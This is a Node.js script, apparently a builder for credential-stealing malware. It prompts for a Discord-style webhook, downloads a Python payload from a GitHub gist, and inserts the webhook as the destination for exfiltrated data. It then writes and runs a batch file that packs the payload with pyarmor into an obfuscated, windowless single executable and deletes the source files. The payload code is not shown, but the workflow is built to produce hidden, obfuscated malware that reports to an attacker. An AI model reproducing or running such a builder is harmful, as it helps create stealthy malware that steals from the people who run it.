const rs = require("readline-sync");
const fs = require("fs");
const os = require("os");
const child_process = require('child_process').exec;
const superagent = require("superagent");
console.clear();

console.log(`\n\n                                    Bonjour ${os.hostname}                                    \n\n`);
var webhook = rs.question("Webhook: ");
if (!webhook) return console.clear(), console.log("Veuillez spécifier le webhook."), rs.question("Webhook: ");


superagent.get(webhook).then(res => {
    if (res.body == undefined) return console.log("Veuillez spécifier un URL valide."), process.exit();
    if (res.body.code == 10015) return console.log("Le webhook n'existe pas!"), process.exit();
});

superagent.get("https://gist.githubusercontent.com/NotPunchnox/3f7572042cace6488d2492f6da47eec3/raw/1688ac7761e36ec851d506f88669483658dea3d7/sltcv").then(response => {


    child_process("start README.md")

    fs.writeFileSync('file.py', response.text, function(err, data) {
        if (err) return console.log(err);
        if (data) return console.log('File.py créé avec succès!');
    })

    fs.readFile("file.py", 'utf8', function(err, data) {
        if (err) {
            return console.log(err);
        }
        var result = data.replace(/punchnox = "dev par punchnox"/g, 'punchnox = ' + '"' + webhook + '"');

        fs.writeFile("file.py", result, 'utf8', function(err) {
            if (err) return console.log(err);
        });
    });

    fs.writeFileSync('compile.bat', `pyarmor pack -e "--onefile --noconsole" file.py\ndel file.py\ndel build\ndel compile.bat`, function(err, data) {
        if (err) return console.log(err);
        console.log('compile.bat créé avec succès!');
    })
    setTimeout(function() {
        child_process("start compile.bat")
    }, 2000)

});